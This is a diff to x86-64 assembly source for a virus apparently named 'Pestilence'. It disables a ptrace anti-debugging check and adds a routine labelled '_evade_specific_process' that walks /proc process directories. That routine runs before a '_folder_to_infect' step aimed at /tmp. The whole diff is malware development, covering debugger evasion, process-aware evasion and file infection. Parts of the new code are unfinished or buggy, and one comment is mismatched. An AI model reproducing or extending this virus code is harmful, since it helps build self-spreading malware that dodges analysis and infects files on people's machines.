@@ -30,6 +30,8 @@
 %define PTRACE_TRACEME 0
 %define SELF_PID 0
 
+%define DT_DIR 4
+
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 ;             BUFFER           ;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
@@ -97,17 +99,89 @@ _start:
 	sub  rsp, PESTILENCE_STACK_SIZE                    ; Reserve some espace in the register r15 to store all the data needed by the program
 	mov r15, rsp
 
-_ptrace_anti_debug:
-	mov rdi, PTRACE_TRACEME
-	mov rsi, SELF_PID
-	lea rdx, 1
-	mov r10, 0
-	mov rax, SYS_PTRACE
+; _ptrace_anti_debug:
+; 	mov rdi, PTRACE_TRACEME
+; 	mov rsi, SELF_PID
+; 	lea rdx, 1
+; 	mov r10, 0
+; 	mov rax, SYS_PTRACE
+; 	syscall
+
+; 	cmp rax, 0
+; 	jl _end
+
+_evade_specific_process:                                  ; cd to /proc
+	mov qword [r15], '/pro'
+	mov qword [r15 + 4], 'c'
+	lea rdi, [r15]
+	mov rax, SYS_CHDIR
 	syscall
 
 	cmp rax, 0
-	jl _end
+	jne _end
 
+	_open_proc:
+		mov rdi, r15
+		mov rsi, O_RDONLY
+		mov rax, SYS_OPEN
+		syscall
+
+		test rax, rax                                  ; checking open
+		js _end
+
+		mov [r15 + 16], rax                            ; saving /tmp/test open fd
+
+	_iterate_over_proc:                                  ; getdents the /proc dir to iterate over all the process folders
+		mov rdi, [r15 + 16]
+		lea rsi, [r15 + 176]
+		mov rdx, DIRENT_BUFFSIZE
+		mov rax, SYS_GETDENTS64
+		syscall
+
+		cmp rax, 0                                     ; no more files in the directory to read
+		je _close_proc
+
+		xor r14, r14                                   ; i = 0 for the first iteration
+		mov r13, rax                                   ; r13 stores the number of read bytes with getdents
+		_proc_loop:
+			movzx r12d, word [r15 + 192 + r14]
+
+			_check_if_process_is_dir:
+				cmp byte [r15 + 194 + r14], DT_DIR
+				jne _continue_proc_loop
+
+			lea r9, [r15 + 195 + r14]
+			_check_if_process_is_num:
+				cmp byte [r9], 0
+				je _pid_folder
+				cmp byte [r9], 48
+				jl _continue_proc_loop
+				cmp byte [r9], 57
+				jg _continue_proc_loop
+				inc r9
+				jmp _check_if_process_is_num
+				
+			_pid_folder:
+				lea rdi, [r15 + 195 + r14]
+				mov rax, SYS_CHDIR
+				syscall
+
+			_return_proc:
+				mov qword [rdi], '..'
+				mov rax, SYS_CHDIR
+				syscall
+
+		_continue_proc_loop:
+			add r14, r12
+			cmp r14, r13
+			jl _proc_loop                           ; if it has still files to read continues to the next one
+			jmp _iterate_over_proc
+
+
+	_close_proc:
+		mov rdi, [r15 + 16]
+		mov rax, SYS_CLOSE
+		syscall
 
 _folder_to_infect:	
 	mov qword [r15], '/tmp'
